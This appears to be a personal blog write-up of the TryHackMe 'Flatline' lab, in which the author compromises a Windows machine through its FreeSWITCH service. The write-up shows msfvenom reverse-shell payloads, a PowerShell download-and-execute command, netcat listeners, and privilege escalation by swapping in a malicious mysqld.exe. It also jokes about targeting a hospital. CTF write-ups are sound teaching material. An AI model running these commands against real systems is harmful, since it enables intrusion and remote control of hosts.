---
title: "Flatline"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src='flatline.jpeg' alt='flatline' width=200>

"My morals are very low"

## Enumeration

### nmap

```
PORT     STATE SERVICE          REASON  VERSION
3389/tcp open  ms-wbt-server    syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-03-25T19:26:24+00:00
|_ssl-date: 2022-03-25T19:26:24+00:00; +2m59s from scanner time.
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Issuer: commonName=WIN-EOM4PK0578N
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-08T16:47:35
| Not valid after:  2022-05-10T16:47:35
| MD5:   6190 7ede 74c9 0701 1160 e36b 2f39 b580
| SHA-1: f3b6 a09c 7ee5 1abd cdbb 03f5 2c63 3e19 6974 659b
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQXDeP1CLg17JO48/W76i0KzANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tRU9NNFBLMDU3OE4wHhcNMjExMTA4MTY0NzM1WhcNMjIw
| NTEwMTY0NzM1WjAaMRgwFgYDVQQDEw9XSU4tRU9NNFBLMDU3OE4wggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDL7cn7UF+DQHuhTJbAfhqR8XMjvt2maC/u
| /q2ZuuoCesWamyIIO1Zh0avn0b/PblDllmdJYlXSoTMA/Vp3Ivv2iRqWHmayboXJ
| WoCdwZVIPR2lUsdAqLumWJqpwFTEsLAPnPPf8+qkrDZcU9ODBS7Ylaytp4Bi37b7
| fGhxEzz4lMRnjXFQhvOlkKSbnyLR40hc9BBLoRB7xrMSSe7tNzqT8MJRX2PGsSyS
| 0FKXnb9845OdYxyj9bey5bje24Tn3v/jDsVQF3Eg1YBZ41559QFPADAqQViszdfG
| hahEdyAfFvL50Wbr0Ql8EzqXha5Fn65+EbXRI4HIyhnXE0sHLQsxAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAlTOaIMVmLC3ey7UxLnB4oFeiYO/EA4axDmgUTXbQpYHdtMPtw1Rd2cSW
| PCZv7Zo5AZuH04g5UZm1W4wLCxleYpfNSsDcSy7yZmGqkhCCHMQRagEvBtDFkcbZ
| Frc6NW2UACE+Y5j4VeiihPFl2bZk4D97O/C6n21XBYeO6BK83wDxni39QG9H+r5/
| qgVrOPcSpyH8jwwfxzuxVNMFgmlVxQWpPmw6n5nX3MdtoIv0hk+XlU7e4K/MU670
| TIzBvqi23ufeMKwr7ROhiBqj4Najbig4cmHT6vNLasFVAlS7IDlYEPQs7XxAZd+L
| ZYBTmjO8tjMZbckOdtXGjjnYHDcFhw==
|_-----END CERTIFICATE-----

8021/tcp open  freeswitch-event syn-ack FreeSWITCH mod_event_socket

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2m59s, deviation: 0s, median: 2m58s

```
Oh nice a windows machine!

The port 8021 got a weird service running

wikipedia said:

>FreeSWITCH is a free and open-source application server for real-time communication, WebRTC, telecommunications, video and Voice over Internet Protocol (VoIP).

Yeah now for the fun part, I add "exploit" to my search query 

Found some exploitdb results but I dont know the version

I also found a metasploit module but...hey let's try the python exploit first 

```
└──╼ $python3 exploit.py 10.10.58.12 whoami
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic

```

well...it works so we should get a reverse shell from this (remember! it's windows)

We use a powershell payload (google or craft it with msfvenom)

So I craft it!

```
└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=10.8.226.203 LPORT=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe

```

Serve it!

```
└──╼ $sudo python3 -m http.server
[sudo] Mot de passe de nair0lf: 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


```

Send it! (and execute it)

```
└──╼ $python3 exploit.py 10.10.58.12 "powershell.exe Invoke-WebRequest -Uri http://10.8.226.203:8000/shell.exe -OutFile ./shell.exe && .\shell.exe"
Authenticated

```

Get in!

```
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 49845
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\FreeSWITCH>

```
FLAG 1 acquired!

```
c:\Users\Nekrotic\Desktop>type user.txt
type user.txt
THM{beep-beep-beep-beep-beep} 
```
```
C:\Users\Nekrotic\Desktop>type root.txt
type root.txt
Access is denied.

```

Obviously...

## Privilege escalation

From the little I know about windows privilege escalation, it's mostly enumeration

First let's check who we are

```
C:\Users\Nekrotic\Desktop>net user
net user

User accounts for \\WIN-EOM4PK0578N

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
Nekrotic                 WDAGUtilityAccount       
The command completed successfully.

```

We are `admin` but cannot read the root flag? outrageous

It's a `system` level flag then! We gotta get there


Now we start looking around from the root

Look what we found!

```
C:\projects>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\projects

09/11/2021  07:18    <DIR>          .
09/11/2021  07:18    <DIR>          ..
09/11/2021  07:29    <DIR>          openclinic
               0 File(s)              0 bytes
               3 Dir(s)  50,528,256,000 bytes free

```
What is `openclinic` you ask? I don't know...let's ask google

>OpenClinic is an easy to use, open source, medical records system written in PHP. It has been mainly thougth for private clinics, surgeries and ...

Do you realise we might have hacked a hospital? XD (c'mon that's funny)

Now I understand why the room is called "flatline"

and why the author ask how low our morals are (very low indeed)

Again, Let's add "exploit" to our google query (the magic word)

The first result is from exploitdb again (then you know it's good stuff)

Just follow the PoC to abuse their mariadb services

Craft the exploit!

```
└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=10.8.226.203 LPORT=2311 -f exe > ./mysqld.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

```

On the target machine, invalidate the real db by renaming it

```
C:\projects\openclinic\mariadb\bin>cd C:\projects\openclinic\mariadb\bin
cd C:\projects\openclinic\mariadb\bin

C:\projects\openclinic\mariadb\bin>ren "mysqld.exe" "mysqld_bak.exe" 
rename "mysqld.exe" "mysqld.bak" 
```
And deliver yours in the same folder (my python server is still up so I dont need apache)

```
C:\projects\openclinic\mariadb\bin>curl http://10.8.226.203:8000/mysqld.exe -o "C:\projects\openclinic\mariadb\bin\mysqld.exe"
curl http://10.8.226.203:8000/mysqld.exe -o "C:\projects\openclinic\mariadb\bin\mysqld.exe"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 73802  100 73802    0     0  73802      0  0:00:01  0:00:01 --:--:-- 68398


```
Restart

```
C:\projects\openclinic\mariadb\bin>shutdown /r /t 1 
shutdown /r /t 1 

```

It took a bit

```
└──╼ $nc -lnvp 2311
listening on [any] 2311 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 49670
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

Get your proof-of-success!

```
C:\Users\Nekrotic\Desktop>type root.txt
type root.txt
THM{beeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeep} 

```

That room was cool!

You would think a clinic/hospital would not be a target for hackers? that's so 2010!

using an open source software doesnt mean you can neglect security!

## Extra

To go further, it seems there were some...less-intended ways to privesc!

First, if you check the privileges you see this:

```
c:\Users\Nekrotic\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name             Description                                State   
=============================================================================

...

SeImpersonatePrivilege  Impersonate a client after authentication    Enabled 

...

```

I redacted the mad-long output so you can just get my point!

The printer spooler service is (almost) always running

```
C:\Users\Nekrotic\Desktop>powershell Get-Service -Name Spooler
powershell Get-Service -Name Spooler


Status   Name               DisplayName                           
------   ----               -----------                           
Running  Spooler            Print Spooler 

```
Now you got everything for a [PrintNightmare](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) or [PrinterSpoofer](https://github.com/itm4n/PrintSpoofer)


Next we got the ownership abuse in powershell to read the flag 

```
takeown /R /F *.*
icacls "root.txt" /q /c /t /grant Users:F
```

This doesnt make you system, but hey...you got the flag


And last but not least...if you used metasploit

`getsystem`

Yeah that's all it takes with metasploit! one.fricking.command!

Metasploit makes things look so easy! lol

I don't know if there are other methods but feel free to look for them!

Take care!
